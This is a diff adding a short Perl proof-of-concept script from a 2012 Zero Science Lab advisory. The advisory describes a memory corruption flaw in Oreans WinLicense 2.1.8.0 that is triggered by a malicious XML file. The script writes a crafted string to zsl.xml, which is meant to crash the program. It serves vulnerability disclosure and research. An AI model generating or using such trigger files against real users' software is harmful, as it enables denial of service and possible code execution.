@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+#
+#
+# Oreans WinLicense v2.1.8.0 XML File Handling Unspecified Memory Corruption
+#
+#
+# Vendor: Oreans Technologies
+# Product web page: http://www.oreans.com
+# Affected version: 2.1.8.0 (32/64bit)
+#
+# Summary: WinLicense combines the same protection-level as Themida with the
+# power of advanced license control, offering the most powerful and flexible
+# technology that allows developers to securely distribute trial and registered
+# versions of their applications.
+#
+# Desc: WinLicense is prone to an unspecified memory corruption vulnerability.
+# An attacker can exploit this issue by tricking a victim into opening a malicious
+# XML file to execute arbitrary code and to cause denial-of-service conditions.
+#
+# Tested on: Microsoft Windows XP Professional SP3 (EN) (32bit)
+#            Microsoft Windows 7 Ultimate SP1 (EN) (64bit)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2012-5080
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5080.php
+#
+#
+# 20.03.2012
+#
+#
+
+use strict;
+
+my $file = "zsl.xml";
+my $hit = "Joxy-\\x\\-Poxy";
+print "\n\n[*] Creating $file file...\n";
+open ZSL, ">./$file" || die "\nCan't open $file: $!";
+print ZSL $hit;
+print "\n[.] File successfully mounted!\n\n";
+close ZSL;
